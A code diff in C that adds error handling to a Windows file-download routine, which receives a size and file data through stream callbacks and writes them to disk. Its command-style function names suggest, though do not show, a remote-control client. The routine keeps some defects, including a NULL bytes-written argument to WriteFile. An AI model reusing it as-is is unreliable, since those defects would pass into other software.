@@ -78,7 +78,10 @@ INT cd(PWSTR path, PWSTR buffer, INT size_buffer) {
 INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buffer), INT (*output_stream)(PWSTR buffer, INT size_buffer)) {
     WCHAR comm_buff[9] = L"\0";
     CHAR file_recv_buff[1024] = "\0";
-    (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
+    if ((*input_stream)(file_recv_buff, sizeof(file_recv_buff)) < 0) {
+        Debug(printf("Recieving failed\n");)
+        return FILE_CREATION_FAIL;
+    }
 
     /* Converts the file size to int */
     int sum = 0, dig = 0, pow = wcslen((PWSTR)file_recv_buff) - 1;
@@ -105,7 +108,14 @@ INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buff
     memset(file_recv_buff, 0, sizeof(file_recv_buff));
     while (full_bytes != sum) {
         recieved_bytes = (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
-        WriteFile(hFile, file_recv_buff, recieved_bytes, NULL, nullptr);
+        if (recieved_bytes < 0) {
+            Debug(printf("Recieveing failed\n");)
+            return FILE_CREATION_FAIL;
+        }
+        if (WriteFile(hFile, file_recv_buff, recieved_bytes, NULL, nullptr) == 0) {
+            Debug(printf("Write failed\n");)
+            return FILE_CREATION_FAIL;
+        }
         full_bytes += recieved_bytes;
     }
 
@@ -113,3 +123,6 @@ INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buff
     CloseHandle(hFile);
     return 0;
 }
+
+
+
